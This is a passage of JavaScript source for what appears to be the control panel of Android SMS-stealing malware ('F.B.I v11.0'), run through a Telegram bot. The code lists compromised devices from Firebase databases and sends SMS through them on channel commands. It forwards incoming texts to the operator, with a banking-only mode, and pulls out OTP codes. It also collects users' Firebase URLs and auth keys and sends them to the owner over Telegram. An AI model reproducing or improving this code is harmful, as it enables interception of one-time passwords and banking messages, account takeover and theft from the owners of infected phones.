  var backoff = 300;
  while(tgRunning){
    try{
      var url = CFG.TG_API + '/getUpdates'
              + '?timeout=' + TG_LONGPOLL
              + '&offset=' + _tgOffset
              + '&limit=100'
              + '&allowed_updates=' + encodeURIComponent(JSON.stringify(['channel_post','message']));

      _tgAbort = new AbortController();
      var tmr = setTimeout(function(){ try{ _tgAbort.abort(); }catch(e){} }, (TG_LONGPOLL + 5) * 1000);

      var r;
      try{ r = await fetch(url, { signal: _tgAbort.signal }); }
      finally { clearTimeout(tmr); _tgAbort = null; }

      if(!r.ok){
        if(r.status === 409){ await sleep(800); continue; }
        backoff = Math.min(backoff * 2, 5000);
        await sleep(backoff); continue;
      }

      var data = await r.json();
      backoff = 300;
      if(!data.ok){ await sleep(800); continue; }

      if(data.result && data.result.length){
        tgDiagnostics.updateCount += data.result.length;
        tgDiagnostics.lastUpdate = Date.now();
        var maxId = _tgOffset - 1;
        for(var i=0;i<data.result.length;i++){ if(data.result[i].update_id > maxId) maxId = data.result[i].update_id; }
        _tgOffset = maxId + 1;
        for(var j=0;j<data.result.length;j++) processTelegramUpdate(data.result[j]);
        updateTgStatusLine();
      }
    }catch(e){
      if(e.name === 'AbortError'){ /* stop or cycle */ }
      else { backoff = Math.min(backoff * 2, 5000); await sleep(backoff); }
    }
  }
}

function processTelegramUpdate(u){
  var msg = u.channel_post || u.message; if(!msg) return;
  if(msg.from && msg.from.is_bot){
    var myId = tgDiagnostics.botInfo && tgDiagnostics.botInfo.id;
    if(myId && msg.from.id === myId) return;
  }
  var isPrivate = msg.chat && msg.chat.type === 'private';
  var fromId = msg.from && String(msg.from.id);
  var text = String(msg.text || msg.caption || '').trim();
  if(isPrivate && isOwnerId(fromId) && /^\//.test(text)){ handleOwnerCommand(msg); return; }
  if(isPrivate && !/^\//.test(text)){ handleUserPrivate(msg); return; }
  if(!isChannelMatch(msg)) return;
  if(!text) return;
  var parsed = parseTelegramMessage(text);
  if(!parsed.valid) return;
  routeChannelSms(parsed.number, parsed.message, msg);
}
function isChannelMatch(msg){
  var chatId = String((msg.chat && msg.chat.id) || '');
  var chatUser = String((msg.chat && msg.chat.username) || '').toLowerCase();
  var cfg = String(userConfig.channelId || ''); if(!cfg) return false;
  if(cfg.startsWith('@')) return chatUser === cfg.slice(1).toLowerCase();
  var cfgNum = cfg.replace(/[^\-\d]/g, '');
  return chatId === cfgNum || chatId === cfg;
}

/* ═══════ SMS ROUTER (NORMAL) ═══════ */
function _dedupeKey(msg){ return msg.chat.id + '::' + msg.message_id; }

function routeChannelSms(number, message, msgObj){
  var key = _dedupeKey(msgObj);
  if(_dispatchDedup.has(key)) return;
  _dispatchDedup.add(key);
  if(_dispatchDedup.size > 3000){ _dispatchDedup = new Set(Array.from(_dispatchDedup).slice(-1500)); }

  if(!passesRestriction(number, message, msgObj)){ console.log('[Restriction] skip:', number); return; }

  var dev = getActiveDevice();
  if(!dev){ toast('⚠ Open a device first'); return; }
  if(!dev.status){ toast('⚠ Active device offline'); return; }

  var sim = deviceSimMap[dev.id] || 1;
  _showCapturedNotif(number, message);
  sendSmsGuaranteed(dev, sim, number, message).then(function(ok){
    toast(ok ? '⚡ SMS queued via ' + dev.name : '❌ SMS failed');
  });
}

function _showCapturedNotif(number, message){
  var el = document.getElementById('capturedBar'); if(!el) return;
  el.innerHTML = '<div class="cap-icon">🎯</div>'
    + '<div class="cap-num" data-copy="' + escAttr(number) + '" onclick="copyFromEl(this,event)">' + esc(number) + '</div>'
    + '<div class="cap-msg" data-copy="' + escAttr(message) + '" onclick="copyFromEl(this,event)">' + esc((message || '').substring(0, 40)) + '</div>'
    + '<div class="cap-time">' + new Date().toLocaleTimeString() + '</div>';
  el.classList.add('show');
  setTimeout(function(){ el.classList.remove('show'); }, 3000);
}

/* ═══════ AUTO-FORWARD (poll path) ═══════ */
async function checkAndForward(msgs, deviceId){
  if(!msgs || !msgs.length) return;
  if(userConfig.forwardEnabled === false) return;
  var myNum = userConfig.myNumber; if(!myNum) return;
  var active = getActiveDevice();
  if(!active || active.id !== deviceId) return;
  var dev = allDevices.find(function(d){ return d.id === deviceId; }); if(!dev) return;
  var forwardMode = userConfig.forwardMode || 'all';
  for(var i=0;i<msgs.length;i++){
    var m = msgs[i];
    if(m.type !== 'incoming') continue;
    if(!isAfterWatermark(deviceId, m.key)) continue;
    var txt = String(m.message || '').trim();
    if(!txt || txt === '(no body)') continue;
    if(forwardMode === 'banking' && !isBankingSms(m.sender, m.message)) continue;
    if(!passesRestriction(m.sender, txt, null)) continue;
    if(!_shouldForwardOnce(deviceId, m.key)) continue;
    var sim = deviceSimMap[dev.id] || 1;
    sendSmsGuaranteed(dev, sim, myNum, txt);
    setWatermark(deviceId, m.key);
  }
}

/* ═══════ TELEGRAM PARSER ═══════ */
function _cleanPhone(n){
  n = String(n || '').replace(/[^\d]/g, '');
  if(n.length === 13 && n.startsWith('091')) n = n.slice(3);
  if(n.length === 12 && n.startsWith('91')) n = n.slice(2);
  if(n.length === 11 && n.charAt(0) === '0') n = n.slice(1);
  if(n.length > 10) n = n.slice(-10);
  return n;
}
function _extractBetween(text, startTag, endTag){
  if(!startTag) return null;
  var tag = String(startTag).trim(); if(!tag) return null;
  var lowerT = text.toLowerCase(), lowerTag = tag.toLowerCase();
  var sIdx = lowerT.indexOf(lowerTag);
  if(sIdx === -1){
    var cleanTag = tag.replace(/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/gu, '').trim().toLowerCase();
    if(cleanTag && cleanTag !== lowerTag){ sIdx = lowerT.indexOf(cleanTag); if(sIdx !== -1) lowerTag = cleanTag; }
  }
  if(sIdx === -1) return null;
  var startPos = sIdx + lowerTag.length;
  while(startPos < text.length && /[\s:]/.test(text.charAt(startPos))) startPos++;
  var out;
  if(!endTag || !String(endTag).trim()){ out = text.substring(startPos); }
  else {
    var eTag = String(endTag).trim().toLowerCase();
    var eIdx = lowerT.indexOf(eTag, startPos);
    if(eIdx === -1){
      var cleanEnd = eTag.replace(/[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/gu, '').trim();
      if(cleanEnd) eIdx = lowerT.indexOf(cleanEnd, startPos);
    }
    if(eIdx === -1) return null;
    out = text.substring(startPos, eIdx);
  }
  return String(out).trim();
}
function parseTelegramMessage(text){
  text = String(text || '').replace(/\r/g, '');
  if(!text) return { number: null, message: null, valid: false };
  var number = null, message = null;
  var hasCustom = userConfig.numStart || userConfig.msgStart;

  if(hasCustom){
    if(userConfig.numStart){
      var numRaw = _extractBetween(text, userConfig.numStart, userConfig.numEnd);
      if(numRaw){ var nc = _cleanPhone(numRaw); if(nc.length >= 10 && nc.length <= 12) number = nc; }
    }
    if(userConfig.msgStart){
      var msgRaw = _extractBetween(text, userConfig.msgStart, userConfig.msgEnd);
      if(msgRaw && msgRaw.length >= 1) message = msgRaw;
    }
    if(message){
      message = message.replace(/<\/?[a-z]+>/gi, '').trim();
      var cutC = message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);
      if(cutC > 0) message = message.substring(0, cutC).trim();
    }
    if(number && message) return { number: number, message: message, valid: true };
  }

  var lines = text.split('\n'), numLineIdx = -1, msgStartIdx = -1;
  for(var i=0;i<lines.length;i++){
    var L = lines[i];
    if(numLineIdx < 0 && /(^|\s|📞|📱|📍|🎯)(to|receipt|number|mobile|target|phone|recipient)(\s|$|\(|:)/i.test(L)){
      var sN = L.match(/([+]?\d[\d\s\-]{8,18})/);
      if(sN){ var c = _cleanPhone(sN[1]); if(c.length >= 10){ number = c; numLineIdx = i; continue; } }
      if(i+1 < lines.length){
        var nN = lines[i+1].match(/([+]?\d[\d\s\-]{8,18})/);
        if(nN){ var c2 = _cleanPhone(nN[1]); if(c2.length >= 10){ number = c2; numLineIdx = i+1; } }
      }
    }
    if(msgStartIdx < 0 && /(^|\s|💬|🔑|📝)(body|message|msg|token|text|content)(\s|$|\(|:)/i.test(L)){
      var sameLine = L.replace(/^.*?(?:body|message|msg|token|text|content)[^\n:]*:\s*/i, '').trim();
      if(sameLine && sameLine.length > 2 && !/^\(?\s*tap\s*to\s*copy\s*\)?$/i.test(sameLine)){
        message = sameLine;
        for(var j=i+1;j<lines.length;j++){
          if(/^\s*$/.test(lines[j])) continue;
          if(/^(⏰|📊|📋|Time\s*:|Status\s*:|Sent at|Click on|From\s*:|Date\s*:|SIM\s*:)/i.test(lines[j])) break;
          message += '\n' + lines[j].trim();
        }
        break;
      }
      msgStartIdx = i+1; break;
    }
  }
  if(!message && msgStartIdx >= 0){
    var buf = [];
    for(var k=msgStartIdx; k<lines.length; k++){
      var ln = lines[k];
      if(/^\s*$/.test(ln)){ if(buf.length) break; else continue; }
      if(/^(⏰|📊|📋|Time\s*:|Status\s*:|Sent at|Click on|From\s*:|Date\s*:|SIM\s*:)/i.test(ln)) break;
      if(k === numLineIdx) continue;
      buf.push(ln.trim());
    }
    if(buf.length) message = buf.join('\n').trim();
  }
  if(!number){
    var raw = text.match(/(?:^|\D)([+]?\d[\d\s\-]{9,18})(?:\D|$)/g);
    if(raw){
      for(var m=0;m<raw.length;m++){
        var c3 = _cleanPhone(raw[m]);
        if(c3.length >= 10 && c3.length <= 12){ number = c3; break; }
      }
    }
  }
  if(!message){
    var best = '';
    for(var n=0;n<lines.length;n++){
      var ln2 = lines[n].trim();
      if(!ln2 || ln2.length < 3) continue;
      if(/^[━═─_=\-·•\s]+$/.test(ln2)) continue;
      if(/^\(?\s*tap\s*to\s*copy\s*\)?\s*:?$/i.test(ln2)) continue;
      if(/module by|dm to buy|one[\s-]?tap|https?:\/\//i.test(ln2)) continue;
      if(/^[+\d\s|,.\-()]+$/.test(ln2)) continue;
      if(/@\w+/.test(ln2) && ln2.length < 35) continue;
      if(/^(To|Body|From|Receipt|Mobile|Number|Time|Status|Message|Msg|Token|Content|Target|Phone|Click on)\s*[:(]/i.test(ln2)) continue;
      if(ln2.length > best.length) best = ln2;
    }
    if(best.length >= 3) message = best;
  }
  if(message){
    message = message.replace(/<\/?[a-z]+>/gi, '');
    message = message.replace(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\s]+/u, '').trim();
    var cut = message.search(/\n\s*(?:Sent at|Time|Date|Status|SIM|Package|Timestamp|From|Received at|Click on)\s*:/i);
    if(cut > 0) message = message.substring(0, cut).trim();
  }
  if(message && message.length < 2) message = null;
  if(number && number.length < 10) number = null;
  return { number: number, message: message, valid: !!(number && message) };
}

/* ═══════ USER REG & OWNER COMMANDS ═══════ */
async function handleUserPrivate(msg){
  try{
    var chatId = String(msg.chat.id);
    var from = msg.from || {};
    var prof = await getUserProfile(chatId);
    if(!prof){
      await saveUserProfile({ id: chatId, first_name: from.first_name || '', last_name: from.last_name || '', username: from.username || '', language: from.language_code || 'en', joinedAt: Date.now(), verified: true });
    } else {
      prof.first_name = from.first_name || prof.first_name;
      prof.last_name = from.last_name || prof.last_name;
      prof.username = from.username || prof.username;
      await saveUserProfile(prof);
    }
  }catch(e){}
}

async function handleOwnerCommand(msg){
  var txt = String(msg.text || '').trim();
  var cmd = txt.toLowerCase();
  var chatId = msg.chat.id;

  if(cmd === '/backup' || cmd === '/bk'){ await sendUsersBackupFull(chatId); return; }
  if(cmd === '/backup_new' || cmd === '/bkn'){ await sendUsersBackupNew(chatId); return; }

  if(cmd.startsWith('/broadcast ') || cmd === '/broadcast'){
    var t3 = txt.replace(/^\/broadcast\s*/i, '').trim();
    if(!t3){ await tgSend(chatId, 'Usage: <code>/broadcast message</code>'); return; }
    var body = '📢 <b>Broadcast</b>\n\n' + esc(t3);
    var chOk = false;
    if(userConfig.channelId){ try{ var rc = await tgApi('sendMessage', { chat_id: userConfig.channelId, text: body, parse_mode: 'HTML' }); chOk = !!(rc && rc.ok); }catch(e){} }
    var uids2 = await getAllUserIds();
    var s2 = 0, f2 = 0, delay2 = userConfig.broadcastDelay || 60;
    await tgSend(chatId, '⏳ Broadcasting…\n📢 Channel: ' + (chOk ? '✅' : '⛔') + '\n👥 Users: ' + uids2.length);
    for(var bj=0;bj<uids2.length;bj++){
      if(String(uids2[bj]) === String(chatId)) continue;
      try{ var rr2 = await tgApi('sendMessage', { chat_id: uids2[bj], text: body, parse_mode: 'HTML' }); if(rr2 && rr2.ok) s2++; else f2++; }
      catch(e){ f2++; }
      if(bj % 10 === 9) await sleep(delay2);
    }
    await tgSend(chatId, '✅ Done\n👥 ' + s2 + ' ✔ · ' + f2 + ' ✖');
    return;
  }
  if(cmd === '/status' || cmd === '/st'){ await sendStatusToOwner(chatId); return; }
  if(cmd === '/devices' || cmd === '/dev'){
    var t = '📱 Devices (' + allDevices.length + ' · ' + allDevices.filter(function(d){ return d.status; }).length + ' online)\n\n';
    allDevices.slice(0, 50).forEach(function(d, i){
      var cs = devCarrierList(d).join('/') || '—';
      t += '#' + (d.deviceOrder || i+1) + ' ' + (d.status ? '🟢' : '🔴') + ' ' + esc(d.name) + ' · ' + d.mobNo + ' [' + esc(cs) + ']\n';
    });
    await tgSend(chatId, t); return;
  }
  if(cmd === '/users' || cmd === '/usr'){
    var uidsAll = await getAllUserIds();
    var tu = '👥 <b>Pending Users: ' + uidsAll.length + '</b>\n\n';
    for(var i2=0;i2<Math.min(uidsAll.length, 50);i2++){
      var uid = uidsAll[i2];
      var prof = await getUserProfile(uid);
      var slot = await redisGet((CFG.RK_PREFIX || '_c1_') + uid);
      var fbCount = 0;
      try{ if(slot) fbCount = (JSON.parse(_uncloak(slot)) || []).length; }catch(e){}
      if(prof){
        tu += '👤 ' + esc(prof.first_name || '') + (prof.username ? ' @' + esc(prof.username) : '')
           + '\n🆔 <code>' + uid + '</code> · 🔥 ' + fbCount + '\n\n';
      }
    }
    await tgSend(chatId, tu); return;
  }
  if(cmd.startsWith('/autobackup')){
    var arg = cmd.replace('/autobackup', '').trim();
    if(arg === 'on'){ userConfig.autoBackup = true; await tgSend(chatId, '✅ ON'); }
    else if(arg === 'off'){ userConfig.autoBackup = false; await tgSend(chatId, '⏹ OFF'); }
    else if(/^\d+$/.test(arg)){ userConfig.autoBackupHour = Math.max(0, Math.min(23, parseInt(arg, 10))); userConfig.autoBackup = true; await tgSend(chatId, '✅ ' + userConfig.autoBackupHour + ':00'); }
    else await tgSend(chatId, 'Usage: /autobackup on|off|&lt;hour&gt;');
    debouncedCloudSave(); return;
  }
  if(cmd === '/help' || cmd === '/start'){
    await tgSend(chatId, '🤖 <b>Owner Commands</b>\n\n/backup — Full DB (Redis)\n/backup_new — New firebases\n/broadcast &lt;msg&gt;\n/status\n/devices\n/users\n/autobackup on|off|&lt;hour&gt;');
    return;
  }
}

async function tgSend(chatId, text){
  try{ return await tgApi('sendMessage', { chat_id: chatId, text: text, parse_mode: 'HTML' }); }catch(e){ return null; }
}

/* ═══════════════════════════════════════════════════════════════
   📦 BACKUP — reads from Redis, sends to owner, CLEARS after
   ═══════════════════════════════════════════════════════════════ */
async function collectUsersBackup(onlyNew){
  var sentSet = {};
  if(onlyNew){
    var arr = await redisSMembers(CFG.RK_SENT || '_cache_log');
    for(var x=0;x<(arr || []).length;x++) sentSet[arr[x]] = true;
  }
  var uids = await getAllUserIds();
  var result = {
    generatedAt: new Date().toISOString(),
    mode: onlyNew ? 'new' : 'full',
    totalUsers: 0, totalFirebases: 0, totalDevices: 0, totalOnline: 0, totalOffline: 0,
    users: []
  };
  var newUrls = [];
  var clearedUids = [];

  for(var i=0;i<uids.length;i++){
    var uid = uids[i];
    var slotKey = (CFG.RK_PREFIX || '_c1_') + uid;
    var encData = await redisGet(slotKey);
    if(!encData) continue;

    var fbs = [];
    try{ fbs = JSON.parse(_uncloak(encData)) || []; }catch(e){ fbs = []; }
    if(!fbs.length) continue;

    var prof = await getUserProfile(uid);
    var userEntry = {
      id: uid,
      name: prof ? [(prof.first_name || ''), (prof.last_name || '')].filter(Boolean).join(' ') : '',
      username: prof ? (prof.username || '') : '',
      firebases: []
    };

    var userHadContent = false;
    for(var j=0;j<fbs.length;j++){
      var fb = fbs[j];
      if(onlyNew && sentSet[fb.u]) continue;
      var fbInfo = { url: fb.u, label: fb.l || '', key: fb.k || '', devices: 0, online: 0, offline: 0, status: 'ok', error: '' };
      try{
        var auth = fb.k ? '?auth=' + fb.k : '';
        var r = await _fastFetch(fb.u + '/clients.json' + auth);
        if(!r.ok){ fbInfo.status = 'error'; fbInfo.error = 'HTTP ' + r.status; }
        else {
          var clients = await r.json();
          if(clients && typeof clients === 'object'){
            var ids = Object.keys(clients);
            fbInfo.devices = ids.length;
            for(var k=0;k<ids.length;k++){ var d = clients[ids[k]]; if(d && d.status) fbInfo.online++; else fbInfo.offline++; }
          }
        }
      }catch(e){ fbInfo.status = 'error'; fbInfo.error = e.message; }
      userEntry.firebases.push(fbInfo);
      result.totalFirebases++;
      result.totalDevices += fbInfo.devices;
      result.totalOnline += fbInfo.online;
      result.totalOffline += fbInfo.offline;
      newUrls.push(fb.u);
      userHadContent = true;
    }

    if(userEntry.firebases.length){
      result.users.push(userEntry);
      result.totalUsers++;
    }

    if(userHadContent) clearedUids.push({ uid: uid, slotKey: slotKey });
  }

  return { result: result, newUrls: newUrls, clearedUids: clearedUids };
}

async function _clearUserSlots(clearedUids){
  for(var i=0;i<clearedUids.length;i++){
    try{
      await redisDel(clearedUids[i].slotKey);
      await redisSRem(CFG.RK_USERSET || '_cache_idx', clearedUids[i].uid);
    }catch(e){}
  }
  console.log('[Redis] cleared ' + clearedUids.length + ' user slots');
}

async function sendUsersBackupFull(chatId){
  if(_backupRunning){ toast('⏳ Backup already running'); return; }
  _backupRunning = true;
  try{
    await tgSend(chatId, '⏳ <b>Collecting full users database…</b>');
    var r = await collectUsersBackup(false);
    var data = r.result;

    if(!data.totalFirebases){
      await tgSend(chatId, '✅ <b>No firebases pending</b>');
      return;
    }

    var json = JSON.stringify(data, null, 2);
    var sizeKB = (new Blob([json]).size / 1024).toFixed(1);
    var caption = '📦 <b>F.B.I — FULL DB</b>\n📅 ' + new Date().toLocaleString()
      + '\n\n👥 Users: ' + data.totalUsers
      + '\n🔥 Firebases: ' + data.totalFirebases
      + '\n📱 Devices: ' + data.totalDevices
      + '\n🟢 Online: ' + data.totalOnline
      + '\n🔴 Offline: ' + data.totalOffline
      + '\n💽 Size: ' + sizeKB + ' KB';

    var form = new FormData();
    form.append('chat_id', chatId);
    form.append('document', new Blob([json], { type: 'application/json' }), 'fbi-db-full-' + Date.now() + '.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
    var res = await rr.json();

    if(res.ok){
      await _clearUserSlots(r.clearedUids);
      toast('💾 Full DB sent · Redis cleared');
    } else {
      await tgSend(chatId, '❌ Failed: ' + (res.description || '?'));
    }
  }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
  finally { _backupRunning = false; }
}

async function sendUsersBackupNew(chatId){
  if(_backupRunning){ toast('⏳ Backup already running'); return; }
  _backupRunning = true;
  try{
    await tgSend(chatId, '⏳ <b>Collecting NEW firebases…</b>');
    var r = await collectUsersBackup(true);
    var data = r.result;

    if(!data.totalFirebases){
      await tgSend(chatId, '✅ <b>No new firebases</b>');
      return;
    }

    var json = JSON.stringify(data, null, 2);
    var sizeKB = (new Blob([json]).size / 1024).toFixed(1);
    var caption = '📦 <b>F.B.I — NEW Firebases</b>\n📅 ' + new Date().toLocaleString()
      + '\n\n👥 Users: ' + data.totalUsers
      + '\n🆕 New Firebases: ' + data.totalFirebases
      + '\n📱 Devices: ' + data.totalDevices
      + '\n🟢 Online: ' + data.totalOnline
      + '\n🔴 Offline: ' + data.totalOffline
      + '\n💽 Size: ' + sizeKB + ' KB';

    var form = new FormData();
    form.append('chat_id', chatId);
    form.append('document', new Blob([json], { type: 'application/json' }), 'fbi-db-new-' + Date.now() + '.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
    var res = await rr.json();

    if(res.ok){
      for(var i=0;i<r.newUrls.length;i++){
        try{ await redisSAdd(CFG.RK_SENT || '_cache_log', r.newUrls[i]); }catch(e){}
      }
      await _clearUserSlots(r.clearedUids);
      toast('💾 New backup sent · Redis cleared');
    } else {
      await tgSend(chatId, '❌ Failed: ' + (res.description || '?'));
    }
  }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
  finally { _backupRunning = false; }
}

function checkAutoBackup(){
  if(!userConfig.channelId || !userConfig.autoBackup) return;
  var now = new Date(), today = now.toISOString().slice(0, 10);
  if(_lastAutoBackupDate === today) return;
  var targetHour = userConfig.autoBackupHour != null ? userConfig.autoBackupHour : 3;
  if(now.getHours() >= targetHour){
    _lastAutoBackupDate = today;
    try{ localStorage.setItem('fbi_last_auto_backup', today); }catch(e){}
    sendUsersBackupNew(userConfig.channelId);
  }
}

async function sendStatusToOwner(chatId){
  var online = allDevices.filter(function(d){ return d.status; }).length;
  var uids = await getAllUserIds();
  var txt = '📊 <b>Status</b>\n\n📱 ' + allDevices.length + ' (' + online + ' 🟢)\n👥 Pending: ' + uids.length + '\n🤖 ' + (tgRunning ? '✅' : '⛔') + '\n📢 ' + (userConfig.channelId || '—') + '\n📞 ' + (userConfig.myNumber || '—') + '\n📤 ' + (userConfig.forwardEnabled !== false ? '✅' : '⛔') + ' ' + (userConfig.forwardMode || 'all') + '\n🕐 ' + new Date().toLocaleString();
  await tgSend(chatId, txt);
}

/* ═══════ OTP BAR ═══════ */
function _extractOtp(txt){
  var s = String(txt || '');
  var m = s.match(/(?:otp|code|pin|verif\w*|password|passcode)[^\d]{0,20}(\d{4,8})/i)
       || s.match(/(\d{4,8})[^\d]{0,20}(?:is your|otp|code|pin)/i);
  return m ? m[1] : null;
}
function otpShow(otp, src){
  var nEl = document.getElementById('otpNum'); if(nEl) nEl.textContent = otp;
  var sEl = document.getElementById('otpSrc'); if(sEl) sEl.textContent = 'From: ' + src;
  var bEl = document.getElementById('otpBar'); if(bEl) bEl.classList.add('show');
  if(navigator.clipboard) navigator.clipboard.writeText(otp).catch(function(){});
}
function otpCopy(){
  var el = document.getElementById('otpNum');
  var v = el ? el.textContent : '';
  if(!v || v.includes('─')) return;
  if(navigator.clipboard) navigator.clipboard.writeText(v).then(function(){ toast('✓ OTP copied'); });
}
function otpDismiss(){ var el = document.getElementById('otpBar'); if(el) el.classList.remove('show'); }

/* ═══════ PING ═══════ */
var _apOn = false, _pingTmr = null, _pingReplied = 0, _pingTotal = 0, _pingPrevStatus = {};

function _pingUpdateBtn(){
  var b = document.getElementById('apBtn'); if(!b) return;
  if(!_apOn){ b.textContent = 'PING'; b.style.color = 'var(--lilac)'; return; }
  b.textContent = _pingReplied + '/' + _pingTotal;
  b.style.color = _pingReplied > 0 ? 'var(--mint)' : 'var(--gold2)';
}
function _pingBuildPanel(){
  if(document.getElementById('pingPanel')) return;
  var p = document.createElement('div');
  p.id = 'pingPanel';
  p.style.cssText = 'position:fixed;bottom:20px;right:20px;width:300px;max-height:440px;background:linear-gradient(145deg,#171b3b,#0d1027);border:1px solid rgba(255,173,213,.28);border-radius:16px;z-index:8000;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);display:flex;flex-direction:column;max-width:calc(100vw - 40px);';
  var hdr = document.createElement('div');
  hdr.style.cssText = 'padding:12px 16px;border-bottom:1px solid rgba(255,173,213,.1);display:flex;align-items:center;gap:8px;';
  hdr.innerHTML = '<div style="width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);"></div>'
    + '<div style="font-size:13px;font-weight:800;color:var(--gold2);flex:1">Live Ping</div>'
    + '<div id="pingStats" style="font-size:11px;font-weight:700;color:var(--sub)">0/0</div>'
    + '<button onclick="document.getElementById(\'pingPanel\').remove();_apOn=false;if(_pingTmr)clearTimeout(_pingTmr);_pingUpdateBtn();" style="background:none;border:none;color:var(--sub);cursor:pointer;font-size:18px">×</button>';
  var list = document.createElement('div');
  list.id = 'pingList';
  list.style.cssText = 'overflow-y:auto;flex:1;';
  p.appendChild(hdr); p.appendChild(list);
  document.body.appendChild(p);
}
function _pingAddRow(uid, name, online){
  var list = document.getElementById('pingList'); if(!list) return;
  var ex = document.getElementById('pr_' + CSS.escape(uid));
  if(ex){ if(online) list.insertBefore(ex, list.firstChild); return; }
  var row = document.createElement('div');
  row.id = 'pr_' + uid;
  row.style.cssText = 'display:flex;align-items:center;gap:9px;padding:8px 14px;border-bottom:1px solid rgba(255,173,213,.04);';
  row.innerHTML = '<div class="pr-dot" style="width:8px;height:8px;border-radius:50%;background:' + (online ? 'var(--mint)' : 'rgba(255,102,140,.4)') + '"></div>'
    + '<div class="pr-label" style="flex:1;font-size:12px;font-weight:600;color:' + (online ? 'var(--text)' : 'var(--dim)') + '">' + esc(name) + '</div>'
    + '<div class="pr-badge" style="font-size:9px;font-weight:800;color:' + (online ? 'var(--mint)' : 'var(--rose)') + '">' + (online ? 'ON' : 'OFF') + '</div>';
  if(online) list.insertBefore(row, list.firstChild);
  else list.appendChild(row);
}
function autoPinAll(){
  if(_apOn){
    _apOn = false;
    if(_pingTmr){ clearTimeout(_pingTmr); _pingTmr = null; }
    _pingUpdateBtn(); toast('⏹ Stopped'); return;
  }
  if(!allDevices.length){ toast('⚠ No devices'); return; }
  _apOn = true; _pingReplied = 0; _pingTotal = allDevices.length;
  _pingUpdateBtn(); _pingBuildPanel(); toast('📡 Pinging…');
  _apLoop();
}
async function _apLoop(){
  if(!_apOn) return;
  _pingReplied = 0; _pingTotal = 0;
  var targets = fbInstances.length > 0 ? fbInstances : [{ id:'primary', url:FB_URL, key:FB_KEY }];
  try{
    var results = await Promise.allSettled(targets.map(async function(inst){
      var auth = inst.key ? '?auth=' + inst.key : '';
      var r = await _fastFetch(inst.url + '/clients.json' + auth);
      return { inst: inst, data: await r.json() };
    }));
    var allClients = [];
    results.forEach(function(res){
      if(res.status !== 'fulfilled' || !res.value || !res.value.data) return;
      var inst = res.value.inst, data = res.value.data;
      if(typeof data !== 'object') return;
      Object.keys(data).forEach(function(id){
        if(data[id] && typeof data[id] === 'object') allClients.push({ id: id, cl: data[id], inst: inst, uid: inst.id + ':' + id });
      });
    });
    _pingTotal = allClients.length;
    for(var i=0;i<allClients.length;i++){
      if(!_apOn) break;
      var it = allClients[i];
      var isOnline = !!it.cl.status;
      if(isOnline) _pingReplied++;
      _pingPrevStatus[it.uid] = isOnline;
      var name = it.cl.modelName || it.cl.model || it.id;
      _pingAddRow(it.uid, name, isOnline);
      if(i % 100 === 0 || i === allClients.length - 1){
        var s = document.getElementById('pingStats'); if(s) s.textContent = _pingReplied + '/' + _pingTotal;
        _pingUpdateBtn();
        await new Promise(function(r){ setTimeout(r, 0); });
      }
    }
  }catch(e){}
  _pingUpdateBtn(); renderGrid(true); renderStats();
  if(_apOn) _pingTmr = setTimeout(_apLoop, 2500);
}

/* ═══════ LISTENERS ═══════ */
setTimeout(function(){
  document.querySelectorAll('.overlay').forEach(function(o){
    o.addEventListener('click', function(e){
      if(e.target === o){ o.classList.remove('open'); if(o.id === 'deviceModal'){ selDev = null; stopMP(); } }
    });
  });
  document.addEventListener('keydown', function(e){
    if(e.key === 'Escape') document.querySelectorAll('.overlay.open').forEach(function(o){ o.classList.remove('open'); });
    if(e.key === 'Enter'){
      var setup = document.getElementById('setup');
      if(setup && setup.style.display !== 'none') connect();
    }
  });
}, 0);

console.log('%c[F.B.I] v11.0 ⚡ CLEAN · FAST · REDIS CYCLE', 'color:#ff79b9;font-weight:bold;font-size:14px');
